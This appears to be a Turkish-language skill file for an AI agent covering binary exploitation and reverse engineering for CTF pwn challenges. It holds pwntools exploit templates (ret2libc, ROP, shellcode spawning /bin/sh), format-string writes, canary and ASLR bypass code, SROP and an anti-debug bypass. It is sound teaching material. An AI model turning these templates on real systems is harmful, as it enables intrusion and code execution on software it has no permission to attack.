---
name: binary-pwn
description: "Binary exploitation ve reverse engineering skill'i. Buffer overflow, ROP chains, format string, heap exploitation, shellcode yazma, ELF/PE analizi, GDB debugging, pwntools exploit geliştirme ve tüm binary saldırı vektörleri. Bu skill'i şu durumlarda kullan: kullanıcı 'binary exploit', 'buffer overflow', 'ROP', 'reverse engineering', 'pwn', 'binary analiz', 'decompile', 'disassemble', 'shellcode', 'format string', 'heap exploit', 'stack overflow', 'GDB', 'Ghidra', 'radare2', 'pwntools', 'ELF analizi', 'checksec' dediğinde veya bir binary/executable dosyanın güvenlik analizi istendiğinde. Herhangi bir binary exploitation, reverse engineering veya düşük seviye güvenlik analizi görevi olduğunda mutlaka bu skill'i kullan."
---

# 💀 Binary Exploitation & Reverse Engineering

Binary dosyaların analizi, tersine mühendisliği ve exploit geliştirilmesi için kapsamlı skill. CTF pwn/reversing kategorileri ve gerçek dünya binary zafiyetlerini kapsar.

## Temel İlke

**"Binary her zaman konuşur — onu dinlemeyi bilmen gerekir."**

## Faz 1: İlk Analiz

### Dosya Tanımlama
```bash
# Dosya tipi
file binary_name

# Mimarisi ve güvenlik kontrolleri
checksec --file=binary_name
# Kontrol et: RELRO, Stack Canary, NX, PIE, ASLR

# Strings — ilginç stringler, flag pattern'leri, hardcoded credential'lar
strings binary_name | grep -iE "flag|password|secret|key|admin|/bin|system"
strings -el binary_name  # Unicode/wide strings

# ELF header
readelf -h binary_name
readelf -l binary_name  # Program headers
readelf -S binary_name  # Section headers
readelf -s binary_name  # Symbol table

# shared libraries
ldd binary_name

# Fonksiyon listesi
nm binary_name
objdump -t binary_name | grep -i "text"
```

### Güvenlik Kontrolleri — Ne Anlama Gelir?
```
RELRO:
  No RELRO     → GOT overwrite mümkün
  Partial      → GOT kısmen korumalı
  Full RELRO   → GOT tamamen read-only

Stack Canary:
  No canary    → Stack buffer overflow direkt exploit edilebilir
  Canary found → Canary leak veya bypass gerekir

NX (No Execute):
  NX disabled  → Stack'te shellcode çalıştırabilirsin
  NX enabled   → ROP/ret2libc gerekir

PIE (Position Independent):
  No PIE       → Adresler sabit, direkt kullanılabilir
  PIE enabled  → Address leak gerekir

ASLR:
  Disabled     → Her çalışmada aynı adresler
  Enabled      → Her seferinde farklı → leak gerekir
```

## Faz 2: Statik Analiz

### Ghidra ile Decompile
```bash
# Ghidra headless mode
analyzeHeadless /tmp/ghidra_project project_name -import binary_name -postScript ExportDecompiled.py

# Kontrol noktaları:
# 1. main() fonksiyonunu bul
# 2. Input alan fonksiyonları bul (gets, scanf, read, recv, fgets)
# 3. Tehlikeli fonksiyonları bul (system, exec, popen, strcpy, sprintf)
# 4. Buffer boyutlarını kontrol et
# 5. Kontrol akışını takip et
```

### Radare2 ile Analiz
```bash
# Açma ve analiz
r2 -A binary_name

# Temel komutlar
afl              # Fonksiyon listesi
pdf @ main       # main'i disassemble et
axt @ sym.func   # Cross-reference bul
iz               # String listesi
iS               # Section listesi
ii               # Import listesi
VV               # Görsel mod (graph)
s main; pdf      # main'e git ve göster
```

### objdump ile Disassembly
```bash
objdump -d binary_name | less
objdump -d -M intel binary_name  # Intel syntax
objdump -d binary_name | grep -A5 "call.*system"
```

## Faz 3: Dinamik Analiz

### GDB + GEF/PEDA
```bash
# GDB ile açma
gdb -q binary_name

# GEF komutları
gef➤ info functions          # Fonksiyon listesi
gef➤ disass main             # main'i disassemble et
gef➤ b *main                 # main'e breakpoint
gef➤ b *0x08048456           # Adrese breakpoint
gef➤ r                       # Çalıştır
gef➤ r < input.txt           # Dosyadan input
gef➤ c                       # Devam et
gef➤ ni                      # Sonraki instruction (step over)
gef➤ si                      # Step into
gef➤ x/20wx $esp             # Stack'i göster (20 word hex)
gef➤ x/20gx $rsp             # Stack'i göster (64-bit)
gef➤ x/s 0x08048abc          # String olarak göster
gef➤ vmmap                   # Memory map
gef➤ info registers          # Register'lar
gef➤ pattern create 200      # Pattern oluştur
gef➤ pattern offset PATTERN  # Offset hesapla
gef➤ checksec                # Güvenlik kontrolleri
gef➤ search-pattern "FLAG"   # Memory'de ara
gef➤ heap bins               # Heap bin'leri göster
gef➤ got                     # GOT tablosu

# ltrace — library call'ları izle
ltrace ./binary_name

# strace — system call'ları izle
strace ./binary_name
```

## Faz 4: Exploit Geliştirme

### Buffer Overflow — Stack Based

#### pwntools ile Exploit Şablonu
```python
#!/usr/bin/env python3
from pwn import *

# Bağlantı ayarları
context.binary = elf = ELF('./binary_name')
context.log_level = 'info'

# Lokal veya remote
if args.REMOTE:
    p = remote('target_ip', target_port)
else:
    p = process('./binary_name')

# GDB attach (debug için)
if args.GDB:
    gdb.attach(p, '''
        b *main+100
        c
    ''')

# ---- EXPLOIT ----

# Offset hesapla (pattern ile veya manual)
offset = 40  # EIP/RIP'e olan mesafe

# Payload oluştur
payload = b'A' * offset

# --- Seçenek 1: ret2win (hedef fonksiyona dön) ---
win_addr = elf.symbols['win']  # veya p64(0x0804xxxx)
payload += p64(win_addr)  # 64-bit için p64, 32-bit için p32

# --- Seçenek 2: ret2libc ---
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# Libc base leak gerekir
libc_base = LEAKED_ADDR - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
# 64-bit: RDI'ya /bin/sh adresi koy
pop_rdi = elf.search(asm('pop rdi; ret')).__next__()
payload += p64(pop_rdi) + p64(bin_sh) + p64(system)

# --- Seçenek 3: ROP Chain ---
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
payload += rop.chain()

# --- Seçenek 4: Shellcode (NX disabled) ---
shellcode = asm(shellcraft.sh())
nop_sled = b'\x90' * 100
payload = nop_sled + shellcode + b'A' * (offset - len(nop_sled) - len(shellcode))
payload += p64(STACK_ADDR)  # NOP sled adresine dön

# Gönder
p.sendline(payload)
p.interactive()
```

### Format String Exploit
```python
from pwn import *

# Format string ile memory okuma
for i in range(1, 20):
    p = process('./binary')
    p.sendline(f'%{i}$x')  # 32-bit
    # p.sendline(f'%{i}$lx')  # 64-bit
    print(f"Offset {i}: {p.recv()}")
    p.close()

# Format string ile yazma
# %n — o ana kadar yazılan byte sayısını adrese yaz
payload = fmtstr_payload(offset, {target_addr: target_value})
```

### Heap Exploitation
```python
# Use-After-Free
# 1. Chunk allocate et
# 2. Free et
# 3. Aynı boyutta yeni chunk allocate et (eski chunk'ı alır)
# 4. Eski referansla erişim → kontrol kazanılır

# Double Free (tcache/fastbin)
# 1. Chunk A allocate et
# 2. Chunk A'yı free et
# 3. Chunk A'yı tekrar free et (double free)
# 4. Allocate → arbitrary address yaz

# House of Force (Top chunk manipulation)
# Wilderness chunk'ın size'ını overwrite et
# İstenen adrese allocation yap
```

### ROP Gadget Bulma
```bash
# ROPgadget
ROPgadget --binary binary_name
ROPgadget --binary binary_name --ropchain
ROPgadget --binary binary_name | grep "pop rdi"

# ropper
ropper --file binary_name
ropper --file binary_name --search "pop rdi"

# one_gadget (libc one-shot RCE)
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

## Faz 5: Özel Konular

### Canary Bypass
```python
# Canary leak (format string ile)
p.sendline('%15$lx')  # Canary offset'ini bul
canary = int(p.readline(), 16)

# Brute-force (fork server'larda)
# Canary byte byte kırılabilir (256 deneme/byte)
```

### PIE/ASLR Bypass
```python
# Address leak gerekir
# puts@GOT, printf, write ile libc adresi leak et
payload = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
p.sendline(payload)
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
```

### Sigreturn Oriented Programming (SROP)
```python
from pwn import *
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
```

### Ret2csu / Ret2dlresolve
```python
# __libc_csu_init gadget'larını kullan
# dlresolve ile arbitrary fonksiyon çağır
ret2dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
```

## Reverse Engineering Teknikleri

### Anti-Debug Bypass
```bash
# ptrace anti-debug
# LD_PRELOAD ile ptrace'i override et
echo 'int ptrace(int a, int b, int c, int d) { return 0; }' > bypass.c
gcc -shared -o bypass.so bypass.c
LD_PRELOAD=./bypass.so ./binary

# GDB'de:
set $eax = 0  # ptrace return değerini 0 yap
```

### Packed/Obfuscated Binary
```bash
# UPX unpack
upx -d packed_binary

# Custom packer
# Memory dump ile çalışan binary'yi yakala
# gdb → dump binary memory dump.bin START_ADDR END_ADDR
```

### .NET Decompile
```bash
# dnSpy veya ILSpy
# dotPeek
```

### Java Decompile
```bash
# jadx (APK/JAR)
jadx -d output_dir app.apk
# JD-GUI
# cfr
java -jar cfr.jar target.class
```

### Python Decompile
```bash
# .pyc dosyaları
uncompyle6 script.pyc
# pycdc
```
